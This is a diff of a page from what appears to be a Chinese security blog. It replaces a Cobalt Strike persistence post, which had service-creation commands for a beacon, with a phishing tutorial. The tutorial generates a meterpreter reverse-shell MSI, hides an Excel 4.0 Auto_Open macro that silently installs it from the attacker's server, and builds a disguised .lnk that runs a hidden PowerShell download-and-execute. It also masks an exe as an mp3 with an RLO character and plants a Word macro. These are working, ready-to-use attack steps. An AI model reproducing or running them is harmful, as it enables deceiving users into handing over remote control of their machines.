@@ -4,13 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="cs-权限维持, Broken-year">
-    <meta name="description" content="cs-权限维持
-权限维持（windows）
-可以使用注册表或者启动项，计划任务，服务，shift，放大镜功能，各种劫持或者利用各种安装的软件
+    <meta name="keywords" content="钓鱼攻击, Broken-year">
+    <meta name="description" content="钓鱼攻击Excel宏钓鱼
+在kali里生成一个木马
 
-实例
-Attacks-&amp;gt;Packages-&amp;gt;Windows Executable (">
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.134 lport=4444 -f msi -o hack.msi">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +20,7 @@ Attacks-&amp;gt;Packages-&amp;gt;Windows Executable (">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>cs-权限维持 | Broken-year</title>
+    <title>钓鱼攻击 | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -314,12 +312,12 @@ Attacks-&amp;gt;Packages-&amp;gt;Windows Executable (">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">cs-权限维持</h1>
+                    <h1 class="description center-align post-title">钓鱼攻击</h1>
                 </div>
             </div>
         </div>
@@ -451,6 +449,10 @@ Attacks-&amp;gt;Packages-&amp;gt;Windows Executable (">
                                 <span class="chip bg-color">cs</span>
                             </a>
                         
+                            <a href="/tags/msf/">
+                                <span class="chip bg-color">msf</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -472,7 +474,7 @@ Attacks-&amp;gt;Packages-&amp;gt;Windows Executable (">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-16
+                    2022-03-18
                 </div>
                 
 
@@ -493,25 +495,91 @@ Attacks-&amp;gt;Packages-&amp;gt;Windows Executable (">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="cs-权限维持"><a href="#cs-权限维持" class="headerlink" title="cs-权限维持"></a>cs-权限维持</h1><blockquote>
-<p>权限维持（windows）</p>
-<p>可以使用注册表或者启动项，计划任务，服务，shift，放大镜功能，各种劫持或者利用各种安装的软件</p>
+                <h1 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h1><h2 id="Excel宏钓鱼"><a href="#Excel宏钓鱼" class="headerlink" title="Excel宏钓鱼"></a>Excel宏钓鱼</h2><blockquote>
+<p>在kali里生成一个木马</p>
 </blockquote>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote>
-<p>Attacks-&gt;Packages-&gt;Windows Executable (s)</p>
-</blockquote>
-<p><img src="/2022/03/16/cs-power/cs-executable.png" alt="image-20220316203258034"></p>
-<blockquote>
-<p>保存下来,然后进入Beacon</p>
-</blockquote>
-<pre><code>cd c:\windows\temp      //进入靶机c盘windows下的temp目录
-upload /root/b.exe        //把保存下来的脚本上传上去
-shell sc create &quot;thisserver&quot; binpath=&quot; c:\windows\temp\b.exe&quot; //创建系统服务
-shell sc description &quot;thisserver&quot; &quot;zheshifuwu&quot;        //描述服务
-shell sc config &quot;thisserver&quot; start= auto        //设置为自动开启
-shell net start &quot;thisserver&quot;                //开启服务
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.134 lport=4444 -f msi -o hack.msi
 </code></pre>
-<p>&#x3D;&#x3D;（<strong>PS</strong>:等号前不加空格,等号后面加空格）&#x3D;&#x3D;</p>
+<blockquote>
+<p>选用msi是因为可以静默安装，进入msf</p>
+</blockquote>
+<pre><code>msfconsole
+</code></pre>
+<pre class=" language-msf"><code class="language-msf">use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp //设置攻击载荷
+set lhost 192.168.1.134       //攻击机ip
+exploit  //开始监听
+</code></pre>
+<p><img src="/2022/03/18/fishing-attack/fish-msf.png" alt="image-20220318101242286"></p>
+<blockquote>
+<p>把msi文件放入&#x2F;var&#x2F;www&#x2F;html文件夹下</p>
+<p>然后启动apache服务</p>
+</blockquote>
+<pre><code>apache2 -k start
+systemctl start apache2
+</code></pre>
+<blockquote>
+<p>进入靶机，打开excel，右键sheet1点击插入，点击MS Excel 4.0宏表</p>
+</blockquote>
+<p><img src="/2022/03/18/fishing-attack/fish-excel.png" alt="image-20220318102430105"></p>
+<blockquote>
+<p>在第一列第一行和第二行分别插入</p>
+</blockquote>
+<pre><code>=EXEC(&quot;msiexec /q /i http://192.168.3.134/hack.msi&quot;)
+=HALT()
+</code></pre>
+<p><img src="/2022/03/18/fishing-attack/fish-exec.png" alt="image-20220318102736146"></p>
+<blockquote>
+<p>然后点击第一列，把名字改成Auto_Open</p>
+</blockquote>
+<p><img src="/2022/03/18/fishing-attack/fish-autoopen.png" alt="image-20220318103121153"></p>
+<blockquote>
+<p>然后右键宏，隐藏</p>
+<p>Ctrl+s保存，保存类型选择为Excel启用宏的工作簿</p>
+<p>接下来只要启用宏，就连接成功了</p>
+</blockquote>
+<h2 id="Ink快捷方式钓鱼"><a href="#Ink快捷方式钓鱼" class="headerlink" title="Ink快捷方式钓鱼"></a>Ink快捷方式钓鱼</h2><blockquote>
+<p>这次用cs玩玩，打开cobaltstrike</p>
+<p>首先生成一个Listener，具体就不细说了，除了ip，其他默认就好</p>
+<p>Attacks-&gt;Web Drive-by-&gt;Scripted Web Delivery （s），监听器选刚创好的</p>
+<p>在靶机创建快捷方式，在快捷方式中输入</p>
+</blockquote>
+<pre><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.3.134:80/a&#39;))&quot;
+</code></pre>
+<p>&#x3D;&#x3D;ps：powershell的路径是c:\windows\system32\windowspowershell\v1.0,他后面的是在攻击机生成的那一段&#x3D;&#x3D;</p>
+<blockquote>
+<p>创建好文件之后，为了能够更加逼真，我们需要更改文件的图标，比如文件夹的</p>
+<p>右键打开属性，更改图标</p>
+</blockquote>
+<pre><code>%SystemRoot%\System32\shell32.dll    //系统图标位置
+</code></pre>
+<blockquote>
+<p>最后只要诱导用户点击，连接就会成功</p>
+</blockquote>
+<h2 id="Unicode字符伪装"><a href="#Unicode字符伪装" class="headerlink" title="Unicode字符伪装"></a>Unicode字符伪装</h2><blockquote>
+<p>首先创建好监听器，然后打开Attacks-&gt;packages-&gt;windows executable</p>
+</blockquote>
+<p><img src="/2022/03/18/fishing-attack/fish-a.png" alt="image-20220318143827787"></p>
+<blockquote>
+<p>把制作的文件放入目标上</p>
+<p>真正文件执行时是a.mp3.exe，a.exe.mp3会让用户觉得是mp3文件</p>
+<p>从右往左写3pm.exe</p>
+<p>修改文件后缀名，先右键插入Unicode字符-&gt;RLO，然后把3pm.exe粘贴进去</p>
+<p>完成</p>
+</blockquote>
+<p>&#x3D;&#x3D;真实名字：a3pm.exe&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;用户看到的名字：aexe.mp3&#x3D;&#x3D;</p>
+<h2 id="word宏钓鱼"><a href="#word宏钓鱼" class="headerlink" title="word宏钓鱼"></a>word宏钓鱼</h2><blockquote>
+<p>Attacks-&gt;Packages-&gt;MS_Office Macro,直接把建好的listener放进去就好</p>
+</blockquote>
+<p><img src="/2022/03/18/fishing-attack/fish-office.png" alt="image-20220318144945228"></p>
+<blockquote>
+<p>然后把内容copy下来，打开目标主机的word，打开视图-&gt;宏，创建一个宏</p>
+</blockquote>
+<p><img src="/2022/03/18/fishing-attack/fish-word.png" alt="image-20220318145632151"></p>
+<blockquote>
+<p>保存为.docm文件，打开启用宏主机就上线了</p>
+</blockquote>
 
                 
             </div>
@@ -538,7 +606,7 @@ shell net start &quot;thisserver&quot;                //开启服务
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/03/16/cs-power/">http://Broken-year.github.io/2022/03/16/cs-power/</a>
+                    <a href="http://Broken-year.github.io/2022/03/18/fishing-attack/">http://Broken-year.github.io/2022/03/18/fishing-attack/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -590,6 +658,10 @@ shell net start &quot;thisserver&quot;                //开启服务
                             
                                 <a href="/tags/cs/">
                                     <span class="chip bg-color">cs</span>
+                                </a>
+                            
+                                <a href="/tags/msf/">
+                                    <span class="chip bg-color">msf</span>
                                 </a>
                             
                         </div>
@@ -763,17 +835,18 @@ shell net start &quot;thisserver&quot;                //开启服务
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/17/cs-morecommand/">
+                <a href="/2022/03/18/fishing-attack/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="cs-多层正向连接">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="钓鱼攻击">
                         
-                        <span class="card-title">cs-多层正向连接</span>
+                        <span class="card-title">钓鱼攻击</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -783,9 +856,9 @@ shell net start &quot;thisserver&quot;                //开启服务
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-18
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -798,6 +871,7 @@ shell net start &quot;thisserver&quot;                //开启服务
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -817,6 +891,10 @@ shell net start &quot;thisserver&quot;                //开启服务
                         <span class="chip bg-color">cs</span>
                     </a>
                     
+                    <a href="/tags/msf/">
+                        <span class="chip bg-color">msf</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -828,13 +906,13 @@ shell net start &quot;thisserver&quot;                //开启服务
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/16/clonesite/">
+                <a href="/2022/03/17/cs-morecommand/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="cs自动克隆网站">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="cs-多层正向连接">
                         
-                        <span class="card-title">cs自动克隆网站</span>
+                        <span class="card-title">cs-多层正向连接</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -845,7 +923,7 @@ shell net start &quot;thisserver&quot;                //开启服务
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-17
                             </span>
                         <span class="publish-author">
                             
